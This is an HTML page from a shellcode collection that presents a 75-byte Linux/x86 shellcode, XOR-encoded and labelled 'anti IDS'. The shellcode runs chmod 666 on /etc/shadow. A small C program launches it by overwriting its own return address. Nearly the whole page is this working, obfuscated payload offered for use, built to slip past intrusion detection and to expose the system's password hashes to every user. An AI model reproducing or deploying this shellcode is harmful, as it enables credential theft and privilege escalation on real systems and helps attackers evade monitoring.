<html><head><title>Linux/x86 - chmod 666 shadow ENCRYPT 75 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
 *
 * s0t4ipv6@shellcode.com.ar
 * 0x17abril0x7d2
 *
 * !!!!! ENCRIPTADA !!!!!

 * 75 bytes
 * chmod 666 /etc/shadow

 * !!!!! ENCRIPTADA !!!!!
 *
 * Para mas informacion
 * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz
 *
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
*/

#include &lt;stdio.h&gt;

char shellcode[]=
&quot;\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x29\x59\x49\x5b\x8a\x04\x0f&quot;
&quot;\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8&quot;
&quot;\xe0\xff\xff\xff\x03\xb6\x90\x07\xbe\x39\xba\x79\x6c\x87\x20&quot;
&quot;\xf0\x48\xcf\x0e\x8f\x40\x3d\xb2\x4e\x0e\x7f\x72\xb2\x97\xf3&quot;
&quot;\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\xfa\xf4\xe7\xdb&quot;;

void main() {
        int *ret;
        ret = (int *)&amp;ret +2;
        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
        (*ret) =(int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
